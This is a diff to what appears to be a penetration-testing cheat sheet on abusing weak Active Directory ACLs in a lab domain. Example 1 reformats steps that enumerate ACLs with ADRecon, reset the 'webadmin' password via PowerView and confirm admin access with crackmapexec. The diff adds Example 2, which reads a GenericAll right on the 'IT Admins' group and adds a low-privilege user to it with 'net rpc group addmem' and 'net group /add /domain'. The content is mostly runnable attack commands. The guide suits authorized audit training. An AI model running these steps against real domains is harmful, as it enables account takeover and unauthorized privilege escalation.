@@ -28,11 +28,12 @@ DACL controls access to an object and SACL controls logging of access attempts.
 
 
 ============================================================================================================
-Example of an attack exploiting weak ACLs - Arbitrary reset another account password
+Example 1 - Abusing weak ACLs to arbitrary reset another domain account password
 ============================================================================================================
 
+--------------------------------------------------------------------------------------------------
 Step 1 - Extract and review the list of ACLs using for example the powershell script 'ADrecon.ps1'
-------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------
 
 PS C:\Users\auditor\Documents\ADRecon-master> .\ADRecon.ps1 -Method ADWS -DomainController 192.168.1.50 -Credential security-lab\auditor -Collect ACLs
 
@@ -49,9 +50,9 @@ webadmin       User	    User-Change-Password         All	                      E
 => All the accounts member of the 'Domain Users' can arbitary reset the password of the account 'Security-lab\webadmin'
    Our account 'security-lab\auditor' is member of the 'Domain Users'.
 
-
+-----------------------------------------------------------------------------------------
 Step 2 - Abuse the weak ACL and reset the password of the account 'security-lab\webadmin'
--------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------
 
 => Using the PowerView framework we reset the password of the account 'security-lab\webadmin' (we choose the password 'Password123!')
 
@@ -70,6 +71,36 @@ PS C:\Users\auditor\Documents> crackmapexec.exe -u webadmin -d security-lab -p P
 07-18-2020 14:32:41 security-lab\webadmin
 
 => It worked, we are indeed local admin of the server 'WEBSRV01'...
+
+
+============================================================================================================
+Example 2 - Abusing weak ACLs to arbitrary add a member into a privileged domain group
+============================================================================================================
+
+--------------------------------------------------------------------------------------------------
+Step 1 - Extract and review the list of ACLs using for example the powershell script 'ADrecon.ps1'
+--------------------------------------------------------------------------------------------------
+
+PS C:\Users\auditor\Documents\ADRecon-master> .\ADRecon.ps1 -Method ADWS -DomainController 192.168.1.50 -Credential security-lab\auditor -Collect ACLs
+
+> file 'DACLs.csv' 
+
+Name	      Type	    ObjectTypeName	  InheritedObjectTypeName	  ActiveDirectoryRights	  AccessControlType	  IdentityReferenceName	  OwnerName	        <SNIP>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																												
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<SNIP>
+"IT Admins"  "Group"   "All"              "All"                     "GenericAll"            "Allow"               "Lowprivuser"          "Domain Admins"   <SNIP>
+<SNIP>
+
+--------------------------------------------------------------------------------------------------
+Step 2 - Abuse the weak ACL to arbitrary add a member into the privileged domain group "IT Admins"
+--------------------------------------------------------------------------------------------------
+
+# Use the "net rpc group" in a Kali Linux:
+  > net rpc group addmem "IT Admins" Lowprivuser -U security-lab/Lowprivuser -S 192.168.1.50
+
+# Use the windows command "net group" in a joigned-domain Windows domain:
+  > runas /noprofile /user:security-lab\Lowprivuser cmd
+  > net group 'IT Admins' Lowprivuser /add /domain
 
 
 ============================================================================================================
